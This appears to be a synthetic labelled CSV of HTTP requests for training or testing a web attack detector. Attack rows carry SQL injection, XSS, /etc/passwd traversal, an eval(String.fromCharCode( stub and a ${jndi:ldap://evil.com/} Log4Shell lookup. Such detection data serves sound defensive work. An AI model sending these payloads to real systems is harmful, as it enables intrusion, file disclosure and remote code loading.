request_method,url,payload,user_agent,response_code,is_attack
GET,/app/page69,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page64,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page40?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page4,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page81,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page65?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page63,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page73,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page99,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page51?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page41,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
PUT,/app/page1,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page86,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
OPTIONS,/app/page59,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page20,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page92,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page50,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page22?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
POST,/app/page66?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page55,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page10,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page13?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page88,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page90,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page70,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page22,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page68,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page31,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page59,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page22,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page2,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
PUT,/app/page62?<script>alert('xss')</script>,<script>alert('xss')</script>,sqlmap/1.0,403,1
POST,/app/page69,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page95?../../../etc/passwd,../../../etc/passwd,Nikto/2.1.6,403,1
POST,/app/page4,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page44,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page79,,sqlmap/1.0,200,0
GET,/app/page3?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page67,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page25,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
PUT,/app/page4,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page12,,sqlmap/1.0,403,0
GET,/app/page16?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (compatible; Baiduspider/2.0),500,1
GET,/app/page77,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page53,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page8,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page62,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page8,,sqlmap/1.0,403,0
OPTIONS,/app/page2?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page32,,sqlmap/1.0,200,0
GET,/app/page18,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
PUT,/app/page54,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page63?../../../etc/passwd,../../../etc/passwd,sqlmap/1.0,403,1
GET,/app/page6,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page91?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page26,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page89?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page75,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page36?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page79,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page61?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page59,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page46,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page5,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page58?../../../etc/passwd,../../../etc/passwd,sqlmap/1.0,500,1
GET,/app/page75,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page60?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Nikto/2.1.6,500,1
GET,/app/page23,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page54?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page21,,sqlmap/1.0,404,0
POST,/app/page87,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page27?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page7,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page68,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page82?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page16?eval(String.fromCharCode(,eval(String.fromCharCode(,Nikto/2.1.6,403,1
GET,/app/page80?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
DELETE,/app/page81,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page88?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page59,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page55,,sqlmap/1.0,200,0
POST,/app/page1,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page14,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page10,,sqlmap/1.0,200,0
POST,/app/page55,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page26,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page63,,sqlmap/1.0,200,0
GET,/app/page71,,sqlmap/1.0,200,0
GET,/app/page31,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page1,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page96?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page51?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page67?eval(String.fromCharCode(,eval(String.fromCharCode(,sqlmap/1.0,500,1
DELETE,/app/page29?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
DELETE,/app/page51?../../../etc/passwd,../../../etc/passwd,sqlmap/1.0,500,1
GET,/app/page1,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page62,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page72,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page6?UNION SELECT * FROM users,UNION SELECT * FROM users,Nikto/2.1.6,500,1
POST,/app/page63,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page31,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page30?' OR 1=1 --,' OR 1=1 --,Nikto/2.1.6,403,1
POST,/app/page49,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page9?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page91,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page64?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (compatible; Baiduspider/2.0),404,1
GET,/app/page91?../../../etc/passwd,../../../etc/passwd,sqlmap/1.0,500,1
POST,/app/page35?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page5?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page62,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page18,,sqlmap/1.0,200,0
POST,/app/page81,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page37,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page16?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page58,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page80,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
PUT,/app/page56,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page46,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page63,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page71,,sqlmap/1.0,200,0
GET,/app/page78?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page73,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page60,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page17,,sqlmap/1.0,200,0
GET,/app/page8?../../../etc/passwd,../../../etc/passwd,sqlmap/1.0,403,1
GET,/app/page97,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
POST,/app/page41?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page23,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page40,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page64,,sqlmap/1.0,200,0
GET,/app/page10,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page4?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page27,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page5,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
PUT,/app/page99,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page52?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page92,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page23?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
POST,/app/page9,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page42,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page43,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page62?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page30?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page33?eval(String.fromCharCode(,eval(String.fromCharCode(,sqlmap/1.0,500,1
POST,/app/page25?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page97,,sqlmap/1.0,200,0
PUT,/app/page47?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page9,,sqlmap/1.0,200,0
PUT,/app/page6,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
GET,/app/page65,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page24,,sqlmap/1.0,200,0
GET,/app/page87,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page23,,Nikto/2.1.6,200,0
POST,/app/page68,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page5,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page16,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page47?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page59,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page3,,Nikto/2.1.6,200,0
PUT,/app/page39,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page38,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page14?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page10?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page31,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page51,,sqlmap/1.0,404,0
GET,/app/page14,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page53?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page61,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page57,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page99,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page75,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page55,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
PUT,/app/page19,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page90,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page44,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page85?UNION SELECT * FROM users,UNION SELECT * FROM users,Nikto/2.1.6,403,1
PUT,/app/page69,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page99,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page94,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
PUT,/app/page77?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
PUT,/app/page77?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page4?<script>alert('xss')</script>,<script>alert('xss')</script>,Nikto/2.1.6,403,1
GET,/app/page98,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page2,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page64,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page50?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page90?UNION SELECT * FROM users,UNION SELECT * FROM users,Nikto/2.1.6,403,1
GET,/app/page81,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page1,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page60,,Nikto/2.1.6,200,0
GET,/app/page58,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page57,,Nikto/2.1.6,404,0
GET,/app/page92,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page28?eval(String.fromCharCode(,eval(String.fromCharCode(,Nikto/2.1.6,403,1
GET,/app/page79,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page67,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page22,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
OPTIONS,/app/page16,,sqlmap/1.0,200,0
GET,/app/page34?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Nikto/2.1.6,500,1
POST,/app/page80,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page85,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page39,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page49,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
POST,/app/page11,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page49?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (compatible; Baiduspider/2.0),500,1
PUT,/app/page89,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page9,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page6,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page3,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page68?eval(String.fromCharCode(,eval(String.fromCharCode(,Nikto/2.1.6,500,1
GET,/app/page99,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page13,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page56,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page99,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page49?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
POST,/app/page52?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page36,,sqlmap/1.0,200,0
GET,/app/page33?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page36,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
PUT,/app/page16,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
OPTIONS,/app/page1,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page18,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page42?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page69?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page64,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page52?eval(String.fromCharCode(,eval(String.fromCharCode(,sqlmap/1.0,403,1
GET,/app/page95,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page19?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page15,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page48,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page47,,sqlmap/1.0,200,0
POST,/app/page58,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page72,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page2?../../../etc/passwd,../../../etc/passwd,sqlmap/1.0,500,1
GET,/app/page62,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page97?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
POST,/app/page80,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page49?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page79?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page53?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
POST,/app/page87,,Nikto/2.1.6,200,0
GET,/app/page2?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page7?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page57,,Mozilla/5.0 (compatible; Baiduspider/2.0),500,0
POST,/app/page22,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page67,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page82,,Nikto/2.1.6,404,0
POST,/app/page37?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page59,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page43?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
OPTIONS,/app/page21,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page36,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page71,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page48,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page83,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page19,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page43,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page1,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page45?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page87,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page72,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
POST,/app/page15,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page62,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page71?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},sqlmap/1.0,403,1
GET,/app/page93,,sqlmap/1.0,200,0
POST,/app/page37?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page41,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page60,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page98,,Mozilla/5.0 (compatible; Baiduspider/2.0),403,0
POST,/app/page86,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page52,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page50,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page28?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,1
PUT,/app/page76,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page61,,Nikto/2.1.6,404,0
POST,/app/page1,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page91,,sqlmap/1.0,200,0
GET,/app/page73,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page54,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page13,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page54,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page27?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page48,,sqlmap/1.0,200,0
GET,/app/page96,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page5?' OR 1=1 --,' OR 1=1 --,sqlmap/1.0,403,1
PUT,/app/page84,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page80,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page12?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page38,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page68,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page8,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page60?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page5?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page15,,sqlmap/1.0,200,0
GET,/app/page35,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page52?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page22,,sqlmap/1.0,200,0
GET,/app/page94,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page18,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page16,,Nikto/2.1.6,403,0
GET,/app/page16,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
PUT,/app/page17,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page23,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page86,,sqlmap/1.0,200,0
POST,/app/page69?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page8,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
